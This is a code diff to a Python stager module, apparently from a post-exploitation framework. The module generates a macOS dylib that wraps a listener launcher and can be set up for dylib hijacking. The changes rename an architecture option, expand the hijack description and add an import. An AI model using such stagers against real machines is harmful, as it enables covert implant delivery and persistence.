@@ -1,5 +1,5 @@
 from lib.common import helpers
-
+import os
 
 class Stager:
 
@@ -31,8 +31,8 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   'python'
             },
-            'Arch' : {
-                'Description'   :   'Arch: x86/x64',
+            'Architecture' : {
+                'Description'   :   'Architecture: x86/x64',
                 'Required'      :   True,
                 'Value'         :   'x86'
             },
@@ -42,10 +42,10 @@ class Stager:
                 'Value'         :   'True'
             },
             'Hijacker' : {
-                'Description'   :   'Generate dylib to be used in a Dylib Hijack',
+                'Description'   :   'Generate dylib to be used in a Dylib Hijack. This provides a dylib with the LC_REEXPORT_DYLIB load command. The path will serve as a placeholder.',
                 'Required'      :   True,
                 'Value'         :   'False'
-            },
+            },          
             'OutFile' : {
                 'Description'   :   'File to write the dylib.',
                 'Required'      :   True,
@@ -73,7 +73,7 @@ class Stager:
         language = self.options['Language']['Value']
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
-        arch = self.options['Arch']['Value']
+        arch = self.options['Architecture']['Value']
         hijacker = self.options['Hijacker']['Value']
         safeChecks = self.options['SafeChecks']['Value']
 
@@ -92,3 +92,4 @@ class Stager:
             launcher = launcher.strip('echo').strip(' | python &').strip("\"")
             dylib = self.mainMenu.stagers.generate_dylib(launcherCode=launcher, arch=arch, hijacker=hijacker)
             return dylib
+
